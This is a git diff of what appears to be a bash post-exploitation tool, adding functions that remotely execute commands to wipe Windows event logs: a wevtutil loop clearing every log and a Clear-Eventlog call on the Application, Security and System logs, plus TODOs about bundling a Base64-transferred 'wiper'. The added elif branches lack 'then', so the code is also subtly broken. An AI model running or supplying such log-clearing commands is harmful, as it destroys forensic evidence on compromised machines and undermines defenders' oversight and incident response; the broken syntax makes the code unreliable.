@@ -299,6 +299,36 @@ function PrivEsc {
     echo "Not implemented"
 }
 
+function WevUtil {
+    local mode=$1
+
+    if [ $mode = "execute" ]
+    then
+        Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
+    elif [ $mode = "script" ]
+    # TODO: Include the wiper and then transfer it with Base64
+        echo "not implemented"
+    else
+    # TODO: If the mode was invalid display the available options to inform the user
+        echo "[-] Invalid mode!"
+    fi
+}
+
+function WinEvent {
+    local mode=$1
+
+    if [ $mode = "execute" ]
+    then
+        Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
+    elif [ $mode = "script" ]
+    # TODO: Include the wiper and then transfer it with Base64
+        echo "not implemented"
+    else
+    # TODO: If the mode was invalid display the available options to inform the user
+        echo "[-] Invalid mode!"
+    fi
+}
+
 function EventViewer {
     local mode=$1
 
@@ -306,6 +336,7 @@ function EventViewer {
     then
         DialogBox "eventvwr.msc"
     else
+    # TODO: If the mode was invalid display the available options to inform the user
         echo "[-] Invalid mode!"
     fi
 }
@@ -460,13 +491,13 @@ function main() {
     
     if [[ ! -f "$COMMAND" && -n "$COMMAND" ]]
     then
-		# When input is string and not a file. It executes command
-		if [ -z "$METHOD" ]
-		then
-		    METHOD="none"
-		fi
-		Execute "$COMMAND" "$METHOD"
-	fi
+        # When input is string and not a file. It executes command
+        if [ -z "$METHOD" ]
+        then
+            METHOD="none"
+        fi
+        Execute "$COMMAND" "$METHOD"
+    fi
     
     # File transfer
     if [[ -f "$INPUT" && -n "$OUTPUT" ]]
